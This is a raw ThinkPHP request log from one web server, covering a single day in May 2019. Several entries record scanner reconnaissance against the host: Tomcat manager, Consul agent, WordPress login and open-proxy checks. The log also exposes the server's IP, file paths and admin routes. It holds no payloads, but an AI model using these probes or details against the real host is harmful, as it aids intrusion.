---------------------------------------------------------------
[2019-05-11T01:41:04+08:00] 180.153.182.229 GET 39.96.87.22/
[运行时间：0.016644s] [吞吐率：60.08req/s] [内存消耗：1,981.41kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T01:41:55+08:00] 180.153.182.229 GET 39.96.87.22/
[运行时间：0.016373s] [吞吐率：61.08req/s] [内存消耗：1,982.10kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (compatible; Wappalyzer)',
  'content-type' => 'application/x-www-form-urlencoded;charset=UTF-8',
  'accept' => 'text/html,*/*',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T01:41:58+08:00] 180.153.182.229 HEAD 39.96.87.22/
[运行时间：0.015830s] [吞吐率：63.17req/s] [内存消耗：1,981.41kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.96.87.22',
  'user-agent' => 'Chrome/54.0 (Windows NT 10.0)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T01:41:58+08:00] 180.153.182.229 HEAD 39.96.87.22:80/
[运行时间：0.015497s] [吞吐率：64.53req/s] [内存消耗：1,982.64kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept-encoding' => 'gzip,deflate,sdch',
  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'chrome 100',
  'host' => '39.96.87.22:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T02:16:19+08:00] 68.115.197.170 GET 39.96.87.22:80/
[运行时间：0.015832s] [吞吐率：63.16req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T02:52:42+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.014894s] [吞吐率：67.14req/s] [内存消耗：1,729.55kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T02:59:10+08:00] 90.77.78.218 GET 39.96.87.22:80/
[运行时间：0.015794s] [吞吐率：63.32req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T04:21:11+08:00] 47.101.189.46 GET csgxjk.com/
[运行时间：0.015774s] [吞吐率：63.40req/s] [内存消耗：1,982.21kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T05:24:11+08:00] 142.59.50.37 GET 39.96.87.22:80/
[运行时间：0.016614s] [吞吐率：60.19req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T06:04:08+08:00] 95.213.177.125 POST check.proxyradar.com/azenv.php?auth=155752584809&a=PSCN&i=660625174&p=80
[运行时间：0.014478s] [吞吐率：69.07req/s] [内存消耗：1,729.46kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T06:05:36+08:00] 138.97.216.244 GET 39.96.87.22:80/
[运行时间：0.015851s] [吞吐率：63.09req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T06:54:41+08:00] 106.14.190.222 GET 39.96.87.22/
[运行时间：0.016037s] [吞吐率：62.36req/s] [内存消耗：1,982.06kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:24:14+08:00] 122.114.250.141 GET 39.96.87.22/
[运行时间：0.016851s] [吞吐率：59.34req/s] [内存消耗：1,982.33kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
  'accept' => '*/*',
  'accept-encoding' => 'gzip;q=1.0,deflate;q=0.6,identity;q=0.3',
  'connection' => 'Keep-Alive',
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:30:59+08:00] 39.107.127.149 GET csgxjk.com/
[运行时间：0.017040s] [吞吐率：58.69req/s] [内存消耗：1,982.21kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:41:15+08:00] 101.132.126.80 GET www.csgxjk.com/
[运行时间：0.016732s] [吞吐率：59.77req/s] [内存消耗：1,982.24kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:50:52+08:00] 117.15.94.9 GET www.123cha.com/
[运行时间：0.016684s] [吞吐率：59.94req/s] [内存消耗：1,982.09kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.11.1.el7.x86_64',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => 'www.123cha.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:50:54+08:00] 117.15.94.9 GET wujieliulan.com/
[运行时间：0.016099s] [吞吐率：62.12req/s] [内存消耗：1,982.06kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.11.1.el7.x86_64',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => 'wujieliulan.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:50:57+08:00] 117.15.94.9 GET www.minghui.org/
[运行时间：0.016775s] [吞吐率：59.61req/s] [内存消耗：1,982.09kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.11.1.el7.x86_64',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => 'www.minghui.org',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:50:57+08:00] 117.15.94.9 GET www.bing.com/
[运行时间：0.016178s] [吞吐率：61.81req/s] [内存消耗：1,982.09kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.11.1.el7.x86_64',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => 'www.bing.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:51:02+08:00] 117.15.94.9 GET www.rfa.org/
[运行时间：0.020908s] [吞吐率：47.83req/s] [内存消耗：1,982.09kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.11.1.el7.x86_64',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => 'www.rfa.org',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:51:02+08:00] 117.15.94.9 GET www.boxun.com/
[运行时间：0.023347s] [吞吐率：42.83req/s] [内存消耗：1,982.09kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.11.1.el7.x86_64',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => 'www.boxun.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T08:51:02+08:00] 117.15.94.9 GET www.epochtimes.com/
[运行时间：0.019036s] [吞吐率：52.53req/s] [内存消耗：1,982.16kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.11.1.el7.x86_64',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => 'www.epochtimes.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T09:00:36+08:00] 177.139.106.212 GET 39.96.87.22:80/
[运行时间：0.016694s] [吞吐率：59.90req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T09:56:07+08:00] 101.132.177.14 GET 39.96.87.22/
[运行时间：0.016456s] [吞吐率：60.77req/s] [内存消耗：1,982.06kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T10:09:33+08:00] 198.20.87.98 GET 39.96.87.22/
[运行时间：0.016427s] [吞吐率：60.88req/s] [内存消耗：1,982.25kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'host' => '39.96.87.22',
  'accept-encoding' => 'identity',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T10:09:35+08:00] 198.20.87.98 GET 39.96.87.22/sitemap.xml
[运行时间：0.015257s] [吞吐率：65.54req/s] [内存消耗：1,729.51kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T10:09:37+08:00] 198.20.87.98 GET 39.96.87.22/.well-known/security.txt
[运行时间：0.014761s] [吞吐率：67.75req/s] [内存消耗：1,729.52kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T10:11:42+08:00] 39.107.116.226 GET csgxjk.com/
[运行时间：0.016594s] [吞吐率：60.26req/s] [内存消耗：1,982.02kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T10:20:00+08:00] 39.107.127.149 GET www.csgxjk.com/
[运行时间：0.016479s] [吞吐率：60.68req/s] [内存消耗：1,982.05kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T10:51:05+08:00] 177.86.218.239 GET 39.96.87.22:80/
[运行时间：0.016358s] [吞吐率：61.13req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T11:43:37+08:00] 162.243.144.166 GET 39.96.87.22/
[运行时间：0.016819s] [吞吐率：59.46req/s] [内存消耗：1,981.84kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T11:46:42+08:00] 80.147.58.52 GET 127.0.0.1/v1/agent/self
[运行时间：0.014956s] [吞吐率：66.86req/s] [内存消耗：1,729.47kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T12:12:31+08:00] 4.34.201.34 GET 39.96.87.22/manager/html
[运行时间：0.014941s] [吞吐率：66.93req/s] [内存消耗：1,729.55kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T12:12:38+08:00] 139.162.119.197 GET 39.96.87.22/
[运行时间：0.015781s] [吞吐率：63.37req/s] [内存消耗：1,981.81kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'HTTP Banner Detection (https://security.ipip.net)',
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T12:58:54+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.014902s] [吞吐率：67.11req/s] [内存消耗：1,729.55kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T13:51:05+08:00] 101.132.126.80 GET csgxjk.com/admin
[运行时间：0.018149s] [吞吐率：55.10req/s] [内存消耗：2,154.41kb] [文件加载：83]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/index_index.php [ array (
  0 => 'userinfo',
  1 => 'menu',
) ]
---------------------------------------------------------------
[2019-05-11T13:57:40+08:00] 202.108.211.151 GET www.csgxjk.com/
[运行时间：0.016835s] [吞吐率：59.40req/s] [内存消耗：1,983.51kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'www.csgxjk.com',
  'upgrade-insecure-requests' => '1',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T13:59:43+08:00] 207.241.230.164 HEAD csgxjk.com/
[运行时间：0.016261s] [吞吐率：61.50req/s] [内存消耗：1,981.73kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
  'connection' => 'close',
  'host' => 'csgxjk.com',
  'accept-encoding' => 'identity',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:00:14+08:00] 47.92.137.155 GET csgxjk.com/
[运行时间：0.016025s] [吞吐率：62.40req/s] [内存消耗：1,982.21kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:31:50+08:00] 47.92.132.229 GET csgxjk.com/admin/main/index.html
[运行时间：0.017269s] [吞吐率：57.91req/s] [内存消耗：2,160.62kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:31:50+08:00] 47.92.132.229 GET csgxjk.com/admin/login/
[运行时间：0.017671s] [吞吐率：56.59req/s] [内存消耗：2,147.57kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T14:33:38+08:00] 47.92.29.149 GET csgxjk.com/admin/login/admin.html
[运行时间：0.017107s] [吞吐率：58.46req/s] [内存消耗：2,132.44kb] [文件加载：80]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:33:38+08:00] 47.92.29.149 GET csgxjk.com/admin/login/index.html
[运行时间：0.017567s] [吞吐率：56.92req/s] [内存消耗：2,147.67kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T14:34:40+08:00] 47.92.124.187 GET csgxjk.com/admin/dashboard/analysis.html
[运行时间：0.017247s] [吞吐率：57.98req/s] [内存消耗：2,149.95kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:34:40+08:00] 47.92.124.187 GET csgxjk.com/admin/login/
[运行时间：0.017302s] [吞吐率：57.80req/s] [内存消耗：2,147.57kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T14:38:14+08:00] 91.209.117.141 GET csgxjk.com/wp-login.php
[运行时间：0.015421s] [吞吐率：64.85req/s] [内存消耗：1,729.55kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T14:39:10+08:00] 101.132.98.159 GET csgxjk.com/admin/menu/index.html
[运行时间：0.017522s] [吞吐率：57.07req/s] [内存消耗：2,145.99kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:39:10+08:00] 101.132.98.159 GET csgxjk.com/admin/login/
[运行时间：0.018343s] [吞吐率：54.52req/s] [内存消耗：2,147.57kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
